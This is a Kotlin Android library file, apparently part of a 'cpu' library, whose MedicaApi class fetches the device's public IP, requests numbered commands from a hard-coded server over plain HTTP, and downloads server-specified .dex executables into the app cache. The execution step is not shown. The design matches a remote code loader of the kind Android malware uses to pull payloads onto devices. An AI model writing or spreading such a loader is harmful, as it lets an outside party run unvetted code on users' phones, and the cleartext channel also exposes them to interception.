package com.tunebrains.cpu.library

import com.google.gson.Gson
import com.tunebrains.cpu.library.cmd.LocalCommand
import com.tunebrains.cpu.library.cmd.RxResult
import com.tunebrains.cpu.library.cmd.ServerCommand
import io.reactivex.Completable
import io.reactivex.Single
import okhttp3.*
import timber.log.Timber
import java.io.File
import java.io.FileOutputStream
import java.io.IOException

data class IPIinfo(val ip: String)
class ApiException(mes: String) : IOException(mes)
class MedicaApi(val gson: Gson, val repository: TokenRepository) {
    private val client = OkHttpClient.Builder().build()
    fun ip(): Single<IPIinfo> {
        return Single.create<IPIinfo> { emitter ->
            client.newCall(Request.Builder().url("https://api6.ipify.org?format=json").build())
                .enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        if (!emitter.isDisposed) {
                            emitter.onError(e)
                        }
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            val body = response.body?.string() ?: ""
                            val info = gson.fromJson(body, IPIinfo::class.java)
                            if (!emitter.isDisposed) {
                                emitter.onSuccess(info)
                            }
                        } else {
                            if (!emitter.isDisposed) {
                                emitter.onError(ApiException("Failed to get client ip"))
                            }
                        }
                    }

                })
        }.retry(3)
    }

    fun informServer(ip: String): Completable {
        return Completable.complete()
    }

    fun command(local: LocalCommand): Single<RxResult<LocalCommand>> {
        Timber.d("Will fetch command from server $local")
        return Single.create { emitter ->
            client.newCall(Request.Builder().url("http://magetic.com/c/api_command?com_id=${local.serverId}").build())
                .enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        if (!emitter.isDisposed) {
                            emitter.onSuccess(RxResult(null, e))
                        }
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            val body = response.body?.string() ?: ""
                            val info = gson.fromJson(body, ServerCommand::class.java)
                            if (info != null) {
                                if (!emitter.isDisposed) {
                                    emitter.onSuccess(RxResult(local.withServer(info), null))
                                }
                            } else {
                                if (!emitter.isDisposed) {
                                    emitter.onSuccess(RxResult(null, ApiException("Fail to get command $local")))
                                }
                            }
                        } else {
                            if (!emitter.isDisposed) {
                                emitter.onSuccess(RxResult(null, ApiException("Fail to get command $local")))
                            }
                        }
                    }

                })
        }
    }

    private fun downloadFile(url: String, root: File): Single<RxResult<File>> {
        Timber.d("Will download file from $url")

        return Single.create { emitter ->
            client.newCall(Request.Builder().url(url).build()).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    if (!emitter.isDisposed) {
                        emitter.onSuccess(RxResult(null, e))
                    }
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        try {
                            val tmp = File.createTempFile("cmd", "dex", root)
                            val fos = FileOutputStream(tmp)
                            response.body?.let {
                                it.byteStream().copyTo(fos)
                            }
                            fos.close()
                            emitter.onSuccess(RxResult(tmp, null))
                        } catch (ex: Throwable) {
                            if (!emitter.isDisposed) {
                                emitter.onSuccess(RxResult(null, ex))
                            }
                        }

                    } else {
                        if (!emitter.isDisposed) {
                            emitter.onSuccess(RxResult(null, ApiException("Fail to download file $url")))
                        }
                    }
                }

            })
        }
    }

    fun downloadCommand(command: LocalCommand, cacheDir: File): Single<RxResult<LocalCommand>> {
        Timber.d("Will download command $command")

        return if (command.server != null) {
            downloadFile(command.server.dex, cacheDir).map {
                if (it.data != null) {
                    RxResult<LocalCommand>(command.withDex(it.data.absolutePath), null)
                } else {
                    RxResult<LocalCommand>(null, it.throwable)

                }
            }
        } else {
            Single.just(RxResult<LocalCommand>(null, ApiException("Failed to download empty server command")))
        }
    }
}